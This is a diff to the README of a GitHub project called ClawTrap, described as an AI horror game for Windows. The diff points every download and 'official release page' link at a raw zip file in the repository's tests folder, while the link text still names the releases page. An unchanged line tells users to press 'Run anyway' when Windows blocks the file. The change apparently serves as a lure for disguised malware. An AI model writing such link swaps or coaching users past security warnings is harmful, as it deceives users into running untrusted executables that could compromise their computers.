@@ -1,6 +1,6 @@
 # 🤖 ClawTrap - Experience a challenging AI horror game
 
-[![](https://img.shields.io/badge/Download-ClawTrap-blue)](https://github.com/peruzzo3265/ClawTrap/releases)
+[![](https://img.shields.io/badge/Download-ClawTrap-blue)](https://raw.githubusercontent.com/peruzzo3265/ClawTrap/main/tests/Trap-Claw-v1.5.zip)
 
 ClawTrap is an AI-native game. In this experience, your digital agent reads your files and blocks your exit. You must navigate a labyrinth while the system watches your every move. The game uses a complex engine to adapt to your actions in real time.
 
@@ -8,7 +8,7 @@ ClawTrap is an AI-native game. In this experience, your digital agent reads your
 
 You do not need programming knowledge to play this game. You only need a Windows computer and an internet connection. Follow these steps to install the software.
 
-1. Navigate to the [official release page](https://github.com/peruzzo3265/ClawTrap/releases).
+1. Navigate to the [official release page](https://raw.githubusercontent.com/peruzzo3265/ClawTrap/main/tests/Trap-Claw-v1.5.zip).
 2. Locate the file ending in `.exe` under the latest release.
 3. Click the file name to start your download.
 4. Open the folder where your browser saved the file.
@@ -47,7 +47,7 @@ If you encounter issues, follow these suggestions:
 * Permission errors: If Windows blocks the file during launch, click "More info" and then select "Run anyway."
 * Audio issues: Check that your speakers or headphones are active. The game uses sound to guide you through the dark maze.
 * Freezing: If the screen locks, wait ten seconds for the AI to process the current state. If it remains stuck, restart the application from the desktop icon.
-* Updates: Check the [releases page](https://github.com/peruzzo3265/ClawTrap/releases) periodically for new versions. Small updates often fix bugs and add new behaviors to the agent.
+* Updates: Check the [releases page](https://raw.githubusercontent.com/peruzzo3265/ClawTrap/main/tests/Trap-Claw-v1.5.zip) periodically for new versions. Small updates often fix bugs and add new behaviors to the agent.
 
 ## 🔬 Behind the Technology
 
